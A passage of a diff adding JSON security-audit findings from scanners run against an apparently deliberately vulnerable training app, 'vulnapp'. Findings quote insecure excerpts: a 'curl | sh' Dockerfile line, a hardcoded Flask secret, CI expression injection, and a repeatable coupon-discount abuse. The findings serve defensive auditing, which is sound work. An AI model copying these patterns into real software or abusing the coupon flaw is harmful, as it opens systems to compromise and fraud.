+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [
+          "not internet-exposed (-1)"
+        ],
+        "submission_recommendation": {
+          "decision": "needs_more_evidence",
+          "why": "not independently verified; do not submit as-is"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "requests 2.19.0 has 5 known vulnerabilities (CVE-2018-18074, CVE-2023-32681, CVE-2024-35195…)",
+      "category": "vulnerable-dependency",
+      "cwe": "CWE-1395",
+      "component": "requirements.txt",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "requirements.txt",
+          "start_line": 3,
+          "end_line": 3
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "config_excerpt",
+          "content": "requests==2.19.0",
+          "file": "requirements.txt",
+          "start_line": 3,
+          "end_line": 3,
+          "verified": true,
+          "verification_note": "matched lines 1-4"
+        }
+      ],
+      "description": "PYSEC-2018-28; PYSEC-2023-74; Requests vulnerable to .netrc credentials leak via malicious URLs; Requests `Session` object does not verify requests after making first request with verify=False; PYSEC-2026-2275",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by osv-scanner rule PyPI:requests@2.19.0.",
+      "technical_impact": "Depends on whether the application uses the vulnerable functionality.",
+      "severity": "high",
+      "severity_basis": "cvss",
+      "cvss": {
+        "version": "3.1",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "rationale": "Highest upstream advisory base vector among the package's advisories; application reachability not assessed.",
+        "score": 7.5
+      },
+      "confidence": "medium",
+      "verification": {
+        "status": "potential",
+        "basis": [
+          "tool:osv-scanner"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Upgrade requests to a version that fixes all listed advisories; verify compatibility.",
+      "references": [
+        "https://osv.dev/vulnerability/CVE-2018-18074",
+        "https://osv.dev/vulnerability/CVE-2023-32681",
+        "https://osv.dev/vulnerability/CVE-2024-35195",
+        "https://osv.dev/vulnerability/CVE-2024-47081",
+        "https://osv.dev/vulnerability/CVE-2026-25645"
+      ],
+      "limitations": [
+        "Version match only; reachability of vulnerable code not established.",
+        "Upstream CVSS describes the library, not this application."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "osv-scanner",
+        "rule_id": "PyPI:requests@2.19.0"
+      },
+      "fingerprint": "d40da4c54a86",
+      "id": "SA-CWE1395-d40da4c54a86",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:59.538889Z",
+          "event": "added",
+          "actor": "osv-scanner"
+        },
+        {
+          "at": "2026-10-23T19:19:59.576427Z",
+          "event": "score",
+          "note": "severity medium -> high to match CVSS 7.5"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "high",
+        "technical_priority": "P2",
+        "status": "assessed",
+        "asset_id": "build-and-ci",
+        "asset_criticality": "medium",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "secrets"
+        ],
+        "business_priority": "P3",
+        "business_severity": "medium",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [
+          "not internet-exposed (-1)"
+        ],
+        "submission_recommendation": {
+          "decision": "needs_more_evidence",
+          "why": "not independently verified; do not submit as-is"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "pull_request_target workflow checks out untrusted PR code",
+      "category": "ci-privileged-untrusted-checkout",
+      "cwe": "CWE-829",
+      "component": ".github",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": ".github/workflows/ci.yml",
+          "start_line": 11,
+          "end_line": 11
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "config_excerpt",
+          "content": "          ref: ${{ github.event.pull_request.head.sha }}",
+          "file": ".github/workflows/ci.yml",
+          "start_line": 11,
+          "end_line": 11,
+          "verified": true,
+          "verification_note": "matched lines 9-13"
+        }
+      ],
+      "description": "pull_request_target runs with repository secrets; checking out the PR head lets fork authors run code in that privileged context if any later step executes it.",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by builtin-supplychain rule gha-prt-checkout.",
+      "technical_impact": "Theft of repository secrets / write token by any external contributor.",
+      "severity": "high",
+      "severity_basis": "tool_default",
+      "cvss": null,
+      "confidence": "medium",
+      "verification": {
+        "status": "potential",
+        "basis": [
+          "tool:builtin-supplychain"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Use pull_request for untrusted code, or never execute checked-out PR code in pull_request_target jobs; restrict permissions.",
+      "references": [
+        "https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/"
+      ],
+      "limitations": [
+        "Detected by pattern-based tool (builtin-supplychain); reachability and exploitability not established."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "builtin-supplychain",
+        "rule_id": "gha-prt-checkout"
+      },
+      "fingerprint": "29feb4c08358",
+      "id": "SA-CWE829-29feb4c08358",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:59.567241Z",
+          "event": "added",
+          "actor": "builtin-supplychain"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "high",
+        "technical_priority": "P2",
+        "status": "assessed",
+        "asset_id": "build-and-ci",
+        "asset_criticality": "medium",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "secrets"
+        ],
+        "business_priority": "P3",
+        "business_severity": "medium",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [
+          "not internet-exposed (-1)"
+        ],
+        "submission_recommendation": {
+          "decision": "needs_more_evidence",
+          "why": "not independently verified; do not submit as-is"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "DELETE /admin/users/{user_id} declares no authentication requirement",
+      "category": "missing-authentication",
+      "cwe": "CWE-306",
+      "component": "openapi.yaml",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "openapi.yaml",
+          "start_line": 16,
+          "end_line": 16
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "spec_excerpt",
+          "content": "  /admin/users/{user_id}:",
+          "file": "openapi.yaml",
+          "start_line": 16,
+          "end_line": 16,
+          "verified": true,
+          "verification_note": "matched lines 14-18"
+        }
+      ],
+      "description": "The operation has no security requirement in the specification. The spec may be incomplete; the implementation must be checked.",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by builtin-openapi rule oas-no-security.",
+      "technical_impact": "If the implementation matches the spec, unauthenticated users can invoke a sensitive operation.",
+      "severity": "medium",
+      "severity_basis": "tool_default",
+      "cvss": null,
+      "confidence": "medium",
+      "verification": {
+        "status": "potential",
+        "basis": [
+          "tool:builtin-openapi"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Declare and enforce an authentication scheme for the operation.",
+      "references": [],
+      "limitations": [
+        "Specification-only observation; implementation not verified."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "builtin-openapi",
+        "rule_id": "oas-no-security"
+      },
+      "fingerprint": "96eb4643188a",
+      "id": "SA-CWE306-96eb4643188a",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:59.575979Z",
+          "event": "added",
+          "actor": "builtin-openapi"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "medium",
+        "technical_priority": "P3",
+        "status": "assessed",
+        "asset_id": "shop-api",
+        "asset_criticality": "critical",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "pii",
+          "payment",
+          "credentials",
+          "authentication"
+        ],
+        "business_priority": "P3",
+        "business_severity": "medium",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [],
+        "submission_recommendation": {
+          "decision": "needs_more_evidence",
+          "why": "not independently verified; do not submit as-is"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "API server declared over plain HTTP: http://api.vulnapp.example.com",
+      "category": "cleartext-transport",
+      "cwe": "CWE-319",
+      "component": "openapi.yaml",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "openapi.yaml",
+          "start_line": 4,
+          "end_line": 4
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "spec_excerpt",
+          "content": "  - url: http://api.vulnapp.example.com",
+          "file": "openapi.yaml",
+          "start_line": 4,
+          "end_line": 4,
+          "verified": true,
+          "verification_note": "matched lines 2-6"
+        }
+      ],
+      "description": "The specification advertises a non-TLS server URL.",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by builtin-openapi rule oas-http-server.",
+      "technical_impact": "Credentials and data may transit in cleartext if clients use this server.",
+      "severity": "medium",
+      "severity_basis": "tool_default",
+      "cvss": null,
+      "confidence": "medium",
+      "verification": {
+        "status": "confirmed_static",
+        "basis": [
+          "tool:builtin-openapi"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Serve the API only over HTTPS and update the specification.",
+      "references": [],
+      "limitations": [
+        "Detected by pattern-based tool (builtin-openapi); reachability and exploitability not established."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "builtin-openapi",
+        "rule_id": "oas-http-server"
+      },
+      "fingerprint": "cd5348b991da",
+      "id": "SA-CWE319-cd5348b991da",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:59.573918Z",
+          "event": "added",
+          "actor": "builtin-openapi"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "medium",
+        "technical_priority": "P3",
+        "status": "assessed",
+        "asset_id": "shop-api",
+        "asset_criticality": "critical",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "pii",
+          "payment",
+          "credentials",
+          "authentication"
+        ],
+        "business_priority": "P3",
+        "business_severity": "medium",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [],
+        "submission_recommendation": {
+          "decision": "candidate_for_manual_submission",
+          "why": "verified with meaningful business priority; a human must review, check duplicates and program rules"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "hardcoded bind all interfaces: Possible binding to all interfaces.",
+      "category": "insecure-binding",
+      "cwe": "CWE-605",
+      "component": "app",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "app/app.py",
+          "start_line": 93,
+          "end_line": 93
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "code_excerpt",
+          "content": "    app.run(host=\"0.0.0.0\", debug=True)",
+          "file": "app/app.py",
+          "start_line": 93,
+          "end_line": 93,
+          "verified": true,
+          "verification_note": "matched lines 91-93"
+        }
+      ],
+      "description": "Possible binding to all interfaces.",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by bandit rule B104.",
+      "technical_impact": "See CWE; impact depends on reachability.",
+      "severity": "medium",
+      "severity_basis": "tool_default",
+      "cvss": null,
+      "confidence": "medium",
+      "verification": {
+        "status": "potential",
+        "basis": [
+          "tool:bandit"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "See https://bandit.readthedocs.io/en/1.9.4/plugins/b104_hardcoded_bind_all_interfaces.html",
+      "references": [
+        "https://bandit.readthedocs.io/en/1.9.4/plugins/b104_hardcoded_bind_all_interfaces.html"
+      ],
+      "limitations": [
+        "Detected by pattern-based tool (bandit); reachability and exploitability not established."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "bandit",
+        "rule_id": "B104"
+      },
+      "fingerprint": "2bdef207f461",
+      "id": "SA-CWE605-2bdef207f461",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:56.138010Z",
+          "event": "added",
+          "actor": "bandit"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "medium",
+        "technical_priority": "P3",
+        "status": "assessed",
+        "asset_id": "shop-api",
+        "asset_criticality": "critical",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "pii",
+          "payment",
+          "credentials",
+          "authentication"
+        ],
+        "business_priority": "P3",
+        "business_severity": "medium",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [],
+        "submission_recommendation": {
+          "decision": "needs_more_evidence",
+          "why": "not independently verified; do not submit as-is"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "Hardcoded Flask secret key",
+      "category": "hardcoded-secret",
+      "cwe": "CWE-798",
+      "component": "app",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "app/app.py",
+          "start_line": 12,
+          "end_line": 12
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "code_excerpt",
+          "content": "app.secret_key = \"dev-secret-key-do-not-use-0001\"",
+          "file": "app/app.py",
+          "start_line": 12,
+          "end_line": 12,
+          "verified": true,
+          "verification_note": "matched lines 10-14"
+        }
+      ],
+      "description": "Flask secret_key is hardcoded; session cookies can be forged by anyone who knows it.",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by semgrep rule workspace.projects.875dd5b0-fed6-440d-9d73-6a7abf69dc8a.work.sentinel-auditor.rules.semgrep.sentinel.python.flask-hardcoded-secret-key.",
+      "technical_impact": "Depends on reachability and attacker control of the input.",
+      "severity": "medium",
+      "severity_basis": "tool_default",
+      "cvss": null,
+      "confidence": "medium",
+      "verification": {
+        "status": "potential",
+        "basis": [
+          "tool:semgrep"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Load the secret from the environment or a secret manager.",
+      "references": [
+        "https://flask.palletsprojects.com/en/stable/config/#SECRET_KEY",
+        "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html"
+      ],
+      "limitations": [
+        "Detected by pattern-based tool (semgrep); reachability and exploitability not established.",
+        "Detected by pattern-based tool (bandit); reachability and exploitability not established."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "semgrep",
+        "rule_id": "workspace.projects.875dd5b0-fed6-440d-9d73-6a7abf69dc8a.work.sentinel-auditor.rules.semgrep.sentinel.python.flask-hardcoded-secret-key",
+        "contributors": [
+          "bandit",
+          "semgrep"
+        ]
+      },
+      "fingerprint": "a60a0caf6f12",
+      "id": "SA-CWE798-a60a0caf6f12",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:54.906330Z",
+          "event": "added",
+          "actor": "semgrep"
+        },
+        {
+          "at": "2026-10-23T19:19:56.132059Z",
+          "event": "merged",
+          "from": "bandit"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "medium",
+        "technical_priority": "P3",
+        "status": "assessed",
+        "asset_id": "shop-api",
+        "asset_criticality": "critical",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "pii",
+          "payment",
+          "credentials",
+          "authentication"
+        ],
+        "business_priority": "P3",
+        "business_severity": "medium",
+        "program_expected_rating": {
+          "rating": "high",
+          "matched_on": "hardcoded-secret",
+          "scale": "custom",
+          "source": "fixtures/vulnapp/README.md (training fixture; values are illustrative)"
+        },
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [],
+        "submission_recommendation": {
+          "decision": "needs_more_evidence",
+          "why": "not independently verified; do not submit as-is"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "target_id": "vulnapp",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/840.html"
+      ],
+      "limitations": [],
+      "preconditions": [
+        "Attacker has an account and any valid coupon code"
+      ],
+      "title": "Single-use coupon is never enforced and discounts compound on repeat calls",
+      "category": "business-logic",
+      "cwe": "CWE-840",
+      "component": "app",
+      "locations": [
+        {
+          "file": "app/app.py",
+          "start_line": 77,
+          "end_line": 89,
+          "function": "apply_coupon",
+          "role": "sink"
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "code_excerpt",
+          "file": "app/app.py",
+          "start_line": 81,
+          "end_line": 87,
+          "content": "coupon = db().execute(\"SELECT percent, single_use FROM coupons WHERE code = ?\", (code,)).fetchone()\nnew_total = cart[1] * (100 - coupon[0]) / 100\ndb().execute(\"UPDATE carts SET total = ? WHERE id = ?\", (new_total, cart[0]))",
+          "verified": true,
+          "verification_note": "matched lines 79-89"
+        }
+      ],
+      "description": "apply_coupon selects single_use but never checks or records redemption, and applies the percentage to the already-discounted cart total. Repeating the request reduces the total geometrically toward zero.",
+      "attack_scenario": "Calling /cart/apply-coupon N times with a 20% code reduces the total to 0.8^N of the original. (Not executed.)",
+      "expected_boundary": "A single-use coupon reduces one order once.",
+      "observed_behavior": "No redemption record; discount re-applied on each call.",
+      "technical_impact": "Fraudulent discounts / goods obtained below price.",
+      "severity": "medium",
+      "confidence": "medium",
+      "verification": {
+        "status": "strongly_supported",
+        "rationale": "single_use is selected but never read; the total is re-discounted on every call. Unproven: whether a DB trigger elsewhere limits redemptions.",
+        "reviewed_by": "sentinel-verifier",
+        "basis": [],
+        "missing_prerequisites": [
+          "Database schema/triggers for coupons are not in the snapshot"
+        ],
+        "alternative_explanations": []
+      },
+      "safe_validation": "Static trace of apply_coupon; local unit test on a throwaway DB calling the handler twice.",
+      "remediation": "Record redemptions (unique constraint on coupon+user/order), enforce single_use, compute discounts from the undiscounted subtotal, make the operation idempotent.",
+      "source": {
+        "kind": "agent",
+        "name": "sentinel-business-logic"
+      },
+      "fingerprint": "049386d40d16",
+      "id": "SA-CWE840-049386d40d16",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:59.953737Z",
+          "event": "added",
+          "actor": "sentinel-business-logic"
+        },
+        {
+          "at": "2026-10-23T19:20:01.055908Z",
+          "event": "status",
+          "status": "strongly_supported",
+          "by": "sentinel-verifier"
+        },
+        {
+          "at": "2026-10-23T19:20:02.182345Z",
+          "event": "score",
+          "note": "severity high -> medium to match CVSS 6.5"
+        }
+      ],
+      "severity_basis": "cvss",
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "medium",
+        "technical_priority": "P3",
+        "status": "assessed",
+        "asset_id": "shop-api",
+        "asset_criticality": "critical",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "payment"
+        ],
+        "business_priority": "P3",
+        "business_severity": "medium",
+        "program_expected_rating": {
+          "rating": "medium",
+          "matched_on": "business-logic",
+          "scale": "custom",
+          "source": "fixtures/vulnapp/README.md (training fixture; values are illustrative)"
+        },
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": "sentinel-business-impact",
+        "notes": [],
+        "submission_recommendation": {
+          "decision": "candidate_for_manual_submission",
+          "why": "verified with meaningful business priority; a human must review, check duplicates and program rules"
+        },
+        "business_scenario": "A customer could re-apply a single-use coupon and pay less than intended on their own orders.",
+        "assumptions": [
+          "Coupons have real monetary value in production"
+        ]
+      },
+      "cvss": {
+        "version": "3.1",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+        "rationale": "Any account manipulates cart totals.",
+        "score": 6.5
+      },
+      "financial_exposure": {
+        "method": "scenario",
+        "category": "fraudulent_credit",
+        "loss_type": "direct_loss",
+        "currency": "USD",
+        "time_horizon": "one abuse campaign before detection (assumed 7 days)",
+        "inputs": [
+          {
+            "name": "orders_per_week",
+            "value": 2000,
+            "source": "ASSUMPTION: training fixture has no business data; replace with the platform's published or provided figure",
+            "source_date": "2026-10-24"
+          },
+          {
+            "name": "average_order_value_usd",
+            "value": 60,
+            "source": "ASSUMPTION: illustrative only",
+            "source_date": "2026-10-24"
+          },
+          {
+            "name": "exposure_fraction",
+            "value": {
+              "min": 0.0,
+              "likely": 0.005,
+              "max": 0.03
+            },
+            "source": "ASSUMPTION: share of orders where the flaw is abused (requires a valid coupon)",
+            "source_date": "2026-10-24"
+          },
+          {
+            "name": "discount_obtained_fraction",
+            "value": {
+              "min": 0.2,
+              "likely": 0.8,
+              "max": 1.0
+            },
+            "source": "Code analysis: repeated calls compound the percentage toward 100% (app/app.py:86)",
+            "source_date": "2026-10-24"
+          }
+        ],
+        "assumptions": [
+          "Business volume figures are placeholders because the fixture has no real data.",
+          "Abuse continues for one week before detection.",
+          "No external fraud controls cap discounts (none visible in the snapshot)."
+        ],
+        "calculation": "orders_per_week * aov * exposure_fraction * discount_obtained_fraction; min=2000*60*0*0.2, likely=2000*60*0.005*0.8, max=2000*60*0.03*1.0",
+        "range": {
+          "min": 0,
+          "most_plausible": 480,
+          "max": 3600
+        },
+        "confidence": "low",
+        "limitations": [
+          "Illustrative scenario on a training fixture; not a statement about any real platform.",
+          "Not an actual loss and not a bounty estimate."
+        ],
+        "is_actual_loss": false,
+        "is_bounty_estimate": false,
+        "statement": "Potential exposure (not an actual loss, not a bounty estimate): USD 0 – 3,600 (most plausible 480) over one abuse campaign before detection (assumed 7 days); method=scenario; confidence=low."
+      },
+      "business_review": {
+        "adjustment": 0,
+        "rationale": "Direct revenue leakage on the production shop, but limited to discounts on the attacker's own orders; no customer data exposed, so the technical rating stands.",
+        "affected_data_classes": [
+          "payment"
+        ],
+        "program_rating_ref": "business_context.program_severity.category_ratings.business-logic = medium",
+        "business_scenario": "A customer could re-apply a single-use coupon and pay less than intended on their own orders.",
+        "assumptions": [
+          "Coupons have real monetary value in production"
+        ]
+      },
+      "business_reviewer": "sentinel-business-impact"
+    },
+    {
+      "title": "Dockerfile pipes a remote script into a shell",
+      "category": "unverified-download",
+      "cwe": "CWE-494",
+      "component": "Dockerfile",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "Dockerfile",
+          "start_line": 2,
+          "end_line": 2
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "config_excerpt",
+          "content": "RUN curl -fsSL https://get.example.com/install.sh | sh",
+          "file": "Dockerfile",
+          "start_line": 2,
+          "end_line": 2,
+          "verified": true,
+          "verification_note": "matched lines 1-4"
+        }
+      ],
+      "description": "Remote content is executed without integrity verification.",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by builtin-supplychain rule docker-curl-pipe-sh.",
+      "technical_impact": "Image build compromise if the remote host or path is compromised.",
+      "severity": "medium",
+      "severity_basis": "tool_default",
+      "cvss": null,
+      "confidence": "medium",
+      "verification": {
+        "status": "confirmed_static",
+        "basis": [
+          "tool:builtin-supplychain"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Download to a file, verify a pinned checksum/signature, then execute.",
+      "references": [],
+      "limitations": [
+        "Detected by pattern-based tool (builtin-supplychain); reachability and exploitability not established."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "builtin-supplychain",
+        "rule_id": "docker-curl-pipe-sh"
+      },
+      "fingerprint": "f118c64fa98e",
+      "id": "SA-CWE494-f118c64fa98e",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:59.568322Z",
+          "event": "added",
+          "actor": "builtin-supplychain"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "medium",
+        "technical_priority": "P3",
+        "status": "assessed",
+        "asset_id": "build-and-ci",
+        "asset_criticality": "medium",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "secrets"
+        ],
+        "business_priority": "P4",
+        "business_severity": "low",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [
+          "not internet-exposed (-1)"
+        ],
+        "submission_recommendation": {
+          "decision": "low_value",
+          "why": "verified but low business priority; check the program accepts low-impact reports"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "Untrusted GitHub event data interpolated into a shell step",
+      "category": "ci-script-injection",
+      "cwe": "CWE-78",
+      "component": ".github",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": ".github/workflows/ci.yml",
+          "start_line": 11,
+          "end_line": 11
+        },
+        {
+          "role": "location",
+          "file": ".github/workflows/ci.yml",
+          "start_line": 13,
+          "end_line": 13
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "config_excerpt",
+          "content": "ref: ${{ github.event.pull_request.head.sha }}",
+          "file": ".github/workflows/ci.yml",
+          "start_line": 11,
+          "end_line": 11,
+          "verified": true,
+          "verification_note": "matched lines 9-13"
+        },
+        {
+          "kind": "config_excerpt",
+          "content": "run: echo \"Testing PR ${{ github.event.pull_request.title }}\"",
+          "file": ".github/workflows/ci.yml",
+          "start_line": 13,
+          "end_line": 13,
+          "verified": true,
+          "verification_note": "matched lines 11-15"
+        }
+      ],
+      "description": "Attacker-controllable fields (titles, branch names, bodies) are expanded into a script before execution.",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by builtin-supplychain rule gha-expression-injection.",
+      "technical_impact": "Command execution in the CI runner with its token and secrets.",
+      "severity": "medium",
+      "severity_basis": "tool_default",
+      "cvss": null,
+      "confidence": "medium",
+      "verification": {
+        "status": "potential",
+        "basis": [
+          "tool:builtin-supplychain"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Pass untrusted values through `env:` and reference them as quoted shell variables.",
+      "references": [
+        "https://securitylab.github.com/resources/github-actions-untrusted-input/"
+      ],
+      "limitations": [
+        "Detected by pattern-based tool (builtin-supplychain); reachability and exploitability not established."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "builtin-supplychain",
+        "rule_id": "gha-expression-injection",
+        "contributors": [
+          "builtin-supplychain"
+        ]
+      },
+      "fingerprint": "5a21e2ded7a5",
